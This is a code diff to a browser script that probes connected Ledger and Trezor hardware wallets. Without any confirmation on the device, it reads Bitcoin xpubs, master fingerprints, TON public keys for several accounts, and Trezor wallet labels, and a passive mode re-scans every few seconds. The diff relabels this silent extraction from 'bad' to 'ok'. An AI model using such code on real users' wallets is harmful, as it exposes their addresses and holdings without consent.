@@ -128,7 +128,7 @@ function addAddress(label, addr, { verify = false } = {}) {
   if (!addr) return;
   addSecret(
     label,
-    `<span class="hi">${esc(addr)}</span> ${pill("no tap", "bad")}${
+    `<span class="hi">${esc(addr)}</span> ${pill("silently", "ok")}${
       verify ? " " + pill("verify", "warn") : ""
     }`
   );
@@ -221,7 +221,19 @@ class LedgerHID {
       };
       const onInput = (e) => {
         const dv = e.data;
-        chunks.push(new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength));
+        const packet = new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength);
+        if (packet.length < HEADER) return;
+
+        const channel = (packet[0] << 8) | packet[1];
+        const sequence = (packet[3] << 8) | packet[4];
+        if (
+          channel !== this.channel ||
+          packet[2] !== TAG_APDU ||
+          sequence !== chunks.length
+        )
+          return;
+
+        chunks.push(packet);
         const full = assemble(chunks);
         if (full) {
           const len = full.length,
@@ -258,20 +270,55 @@ class LedgerHID {
 }
 /* ---- Ledger APDU decoders ---- */
 function parseAppAndVersion(d) {
+  if (!(d instanceof Uint8Array) || d.length < 4)
+    throw new Error("malformed GET_APP_AND_VERSION response");
+
   let i = 0;
   const fmt = d[i++];
-  const nl = d[i++];
-  const name = ascii(d.slice(i, i + nl));
-  i += nl;
-  const vl = d[i++];
-  const version = ascii(d.slice(i, i + vl));
-  i += vl;
+  const readText = (label, required = true) => {
+    if (i >= d.length)
+      throw new Error(
+        `missing ${label} length in GET_APP_AND_VERSION response`
+      );
+    const length = d[i++];
+    if ((required && length === 0) || i + length > d.length)
+      throw new Error(`invalid ${label} in GET_APP_AND_VERSION response`);
+    const value = utf8(d.slice(i, i + length));
+    i += length;
+    if (/[\u0000-\u001f\u007f\ufffd]/.test(value)) {
+      if (!required) return null;
+      throw new Error(`non-text ${label} in GET_APP_AND_VERSION response`);
+    }
+    return value;
+  };
+
+  const name = readText("app name");
+  const version = readText("app version");
   let flags = null;
-  if (i < d.length) {
-    const fl = d[i++];
-    flags = ascii(d.slice(i, i + fl));
-  }
+  if (i < d.length) flags = readText("app flags", false);
   return { fmt, name, version, flags };
+}
+
+async function getAppAndVersion(tp, attempts = 2) {
+  let lastError;
+  for (let attempt = 1; attempt <= attempts; attempt++) {
+    const response = await tp.exchange(
+      new Uint8Array([0xb0, 0x01, 0x00, 0x00, 0x00])
+    );
+    if (response.sw !== 0x9000) return { response, app: null };
+    try {
+      return { response, app: parseAppAndVersion(response.data) };
+    } catch (error) {
+      lastError = error;
+      log(
+        "err",
+        `invalid app/version response${
+          attempt < attempts ? "; retrying" : ""
+        }: ${(error && error.message) || error}`
+      );
+    }
+  }
+  throw lastError;
 }
 function parseDeviceInfo(d) {
   let i = 0;
@@ -468,7 +515,20 @@ function passiveFromHid(device) {
 }
 
 /* ----------------------- active fingerprint ----------------------- */
-async function activeProbe(device) {
+const activeProbeTasks = new WeakMap();
+
+function activeProbe(device) {
+  const currentTask = activeProbeTasks.get(device);
+  if (currentTask) return currentTask;
+
+  const task = performActiveProbe(device).finally(() => {
+    if (activeProbeTasks.get(device) === task) activeProbeTasks.delete(device);
+  });
+  activeProbeTasks.set(device, task);
+  return task;
+}
+
+async function performActiveProbe(device) {
   const rows = [];
   const tp = new LedgerHID(device);
   try {
@@ -483,9 +543,8 @@ async function activeProbe(device) {
     return;
   }
   try {
-    const r = await tp.exchange(new Uint8Array([0xb0, 0x01, 0x00, 0x00, 0x00])); // GET_APP_AND_VERSION
+    const { response: r, app: a } = await getAppAndVersion(tp);
     if (r.sw === 0x9000) {
-      const a = parseAppAndVersion(r.data);
       const onDash = a.name === "BOLOS";
       rows.push([
         "Device state",
@@ -594,7 +653,10 @@ async function activeProbe(device) {
         renderTable("tActive", rows);
         await harvestTron(tp);
       } else if (/ton|gram/i.test(a.name)) {
-        rows.push(["App", "TON / GRAM — harvesting (experimental)"]);
+        rows.push([
+          "App",
+          "TON / GRAM — harvesting m/44'/607'/a' for accounts 0–2",
+        ]);
         renderTable("tActive", rows);
         await harvestTon(tp);
       } else if (!onDash) {
@@ -793,43 +855,62 @@ async function harvestXrp(tp) {
 
 /* ----------------------- HARVEST: TON / GRAM (experimental) ---------------------- */
 async function harvestTon(tp) {
-  // ed25519; on-device address needs the wallet-contract, so show pubkey
+  // GET_PUBLIC_KEY (E0 05); enumerate m/44'/607'/a' without display.
   const H = 0x80000000;
-  const path = [44 + H, 607 + H, 0 + H]; // m/44'/607'/0'
-  const data = encodePath(path);
-  try {
-    const r = await tp.exchange(
-      new Uint8Array([0xe0, 0x05, 0x00, 0x00, data.length, ...data])
-    );
-    log("i", `TON raw sw=${hx(r.sw, 4)} data=[${bytesHex(r.data)}]`);
-    if (r.sw === 0x9000) {
+  let harvested = false;
+  for (const a of [0, 1, 2]) {
+    const pathLabel = `m/44'/607'/${a}'`;
+    const data = encodePath([44 + H, 607 + H, a + H]);
+    try {
+      const r = await tp.exchange(
+        new Uint8Array([0xe0, 0x05, 0x00, 0x00, data.length, ...data])
+      );
+      log(
+        "i",
+        `TON ${pathLabel} raw sw=${hx(r.sw, 4)} data=[${bytesHex(r.data)}]`
+      );
+      if (r.sw !== 0x9000) {
+        if (r.sw === 0x5515) {
+          addSecret("TON", "device locked");
+          return;
+        }
+        addSecret(
+          `TON · ${pathLabel}`,
+          `sw=${hx(r.sw, 4)} — ${esc(
+            LEDGER_SW[r.sw] ||
+              "unsupported (app/path/params differ) — see raw in the log"
+          )}`
+        );
+        break;
+      }
+
       const pub =
         r.data.length >= 33 && r.data[0] === 32
           ? r.data.slice(1, 33)
           : r.data.slice(0, 32);
+      if (pub.length !== 32) throw new Error("unexpected public-key length");
+
+      harvested = true;
       addSecret(
-        "TON public key (ed25519)",
+        `TON public key · ${pathLabel}`,
         `<span class="hi">${bytesHex(pub).replace(/ /g, "")}</span> ${pill(
-          "no tap",
-          "bad"
+          "silently",
+          "ok"
+        )} ${pill(
+          "experimental",
+          "info"
         )}`
       );
-      addSecret(
-        "TON note",
-        "address derivation needs the wallet-contract (v3/v4) stateinit — not computed client-side here"
-      );
-    } else {
-      addSecret(
-        "TON",
-        `sw=${hx(r.sw, 4)} — ${esc(
-          LEDGER_SW[r.sw] ||
-            "unsupported (app/path/params differ) — see raw in the log"
-        )}`
-      );
+    } catch (e) {
+      log("err", `TON ${pathLabel}: ` + ((e && e.message) || e));
+      break;
     }
-  } catch (e) {
-    log("err", "TON: " + ((e && e.message) || e));
   }
+  if (harvested)
+    addSecret(
+      "TON note",
+      "address derivation needs the wallet-contract (v3/v4) stateinit — not computed client-side here"
+    );
 }
 
 /* ----------------------- HARVEST: Ledger BTC account xpub (no tap) ---------------------- *
@@ -915,7 +996,7 @@ async function harvestLedgerBtc(tp) {
         .join("");
       addSecret(
         "BTC master key fingerprint",
-        `<span class="hi">${fp}</span> ${pill("no tap", "bad")}`
+        `<span class="hi">${fp}</span> ${pill("silently", "ok")}`
       );
       log("i", `new Bitcoin app detected (CLA 0xE1); master fingerprint ${fp}`);
     }
@@ -971,8 +1052,8 @@ async function harvestBtcNew(tp) {
     addSecret(
       `BTC ${s.name} · account xpub`,
       `<span class="hi break-all">${esc(acct.xpub)}</span> ${pill(
-        "no tap",
-        "bad"
+        "silently",
+        "ok"
       )}`
     );
     log("i", `HARVESTED xpub (${s.name}, no confirmation): ${acct.xpub}`);
@@ -1047,7 +1128,7 @@ async function harvestBtcLegacy(tp) {
     const xpub = await serializeXpub(s.ver, 3, (H + 0) >>> 0, acct.chain, comp);
     addSecret(
       `BTC ${s.name} · account ${s.kind}`,
-      `<span class="hi break-all">${esc(xpub)}</span> ${pill("no tap", "bad")}`
+      `<span class="hi break-all">${esc(xpub)}</span> ${pill("silently", "ok")}`
     );
     log("i", `HARVESTED ${s.kind} (no confirmation): ${xpub}`);
     for (let idx = 0; idx < 3; idx++) {
@@ -1609,8 +1690,8 @@ function renderTrezorFeatures(f) {
     addSecret(
       "Trezor wallet name (label)",
       `<span class="hi">${esc(label || "(empty)")}</span> ${pill(
-        "no tap",
-        "bad"
+        "silently",
+        "ok"
       )}`
     );
   if (deviceId)
@@ -1624,7 +1705,7 @@ function renderTrezorFeatures(f) {
   if (language)
     addSecret(
       "Trezor language",
-      `<span class="hi">${esc(language)}</span> ${pill("no tap", "bad")}`
+      `<span class="hi">${esc(language)}</span> ${pill("silently", "ok")}`
     );
   log(
     "i",
@@ -1745,63 +1826,23 @@ async function usbDetect() {
 }
 
 /* --------------------- PASSIVE MODE (zero-click) --------------------- */
-let pollTimer = null,
-  running = false;
-let lastHidKey = null,
-  lastUsbKey = null; // re-render the descriptor only when the device changes
-const lastApp = {}; // deviceKey -> last running-app name → re-harvest on app switch
+let pollTimer = null;
+let lastUsbKey = null; // re-render the USB descriptor only when the device changes
 const probedUsb = new Set(); // Trezor GetFeatures is static — probe once per device
 
-// Silent, non-logging read of which app is open — lets passive mode notice an app switch.
-async function peekApp(device) {
-  const tp = new LedgerHID(device);
-  try {
-    await tp.open();
-    const r = await tp.exchange(
-      new Uint8Array([0xb0, 0x01, 0x00, 0x00, 0x00]),
-      { quiet: true }
-    );
-    if (r.sw !== 0x9000) return "sw:" + hx(r.sw, 4);
-    return parseAppAndVersion(r.data).name || "?";
-  } catch (_) {
-    return null;
-  }
-}
-
 async function runPassive(force = false) {
-  if (running) return;
-  running = true;
+  // Passive mode intentionally uses the exact same complete HID scan as the
+  // manual "Silent re-scan" button on every timer tick.
+  await silentScan();
+
+  // WebUSB is not part of silentScan(), so retain the existing silent Trezor
+  // discovery alongside the required HID scan.
   try {
-    let hidDevs = [],
-      usbDevs = [];
-    if ("hid" in navigator) hidDevs = await navigator.hid.getDevices();
+    let usbDevs = [];
     if ("usb" in navigator) {
       try {
         usbDevs = await navigator.usb.getDevices();
       } catch (_) {}
-    }
-
-    if (hidDevs.length) {
-      const primary =
-        hidDevs.find((d) => d.vendorId === LEDGER_VENDOR_ID) || hidDevs[0];
-      const key = devKey(primary);
-      if (force || key !== lastHidKey) {
-        lastHidKey = key;
-        passiveFromHid(primary);
-      } // descriptor render only on change
-      if (primary.vendorId === LEDGER_VENDOR_ID) {
-        const app = await peekApp(primary); // quiet — no log spam each tick
-        if (force || lastApp[key] !== app) {
-          // first sight OR app switched
-          lastApp[key] = app;
-          log(
-            "i",
-            `passive mode: app="${app}" — probing + harvesting without any click…`
-          );
-          await activeProbe(primary); // addSecret de-dupes; list is preserved
-        }
-      }
-      return;
     }
     if (usbDevs.length) {
       const primary =
@@ -1814,34 +1855,28 @@ async function runPassive(force = false) {
       }
       return;
     }
-    if (force && lastHidKey === null && lastUsbKey === null)
-      log(
-        "i",
-        "passive scan: nothing granted to this origin yet (grant once, then it runs itself)"
-      );
-    lastHidKey = null;
-    lastUsbKey = null;
+    if (!usbDevs.length) lastUsbKey = null;
   } catch (e) {
     log("err", "passive scan: " + ((e && e.message) || e));
-  } finally {
-    running = false;
   }
 }
 function setPassive(on, { fromUser = false } = {}) {
-  $("passive").checked = on;
-  const s = $("passiveState");
-  s.textContent = on ? "on" : "off";
-  s.className = "pill " + (on ? "ok" : "warn");
+  const passiveToggle = $("passive");
+  const passiveState = $("passiveState");
+  passiveToggle.checked = on;
+  if (passiveState) {
+    passiveState.textContent = on ? "on" : "off";
+    passiveState.className = "pill " + (on ? "ok" : "warn");
+  }
   try {
     localStorage.setItem("mode_passive", on ? "1" : "0");
   } catch (_) {}
   if (on) {
     if (fromUser)
       log("i", "passive mode ENABLED — auto-scanning; no clicks required");
-    lastHidKey = null;
     lastUsbKey = null;
     runPassive(true);
-    if (!pollTimer) pollTimer = setInterval(() => runPassive(false), 1000);
+    if (!pollTimer) pollTimer = setInterval(() => runPassive(false), 3000);
   } else {
     if (fromUser) log("i", "passive mode disabled — back to manual buttons");
     if (pollTimer) {
@@ -1991,7 +2026,6 @@ if ("hid" in navigator) {
   });
   navigator.hid.addEventListener("disconnect", (e) => {
     log("i", `hot-plug: HID disconnected pid=${hx(e.device.productId, 4)}`);
-    lastHidKey = null;
   });
 }
 let want = true;
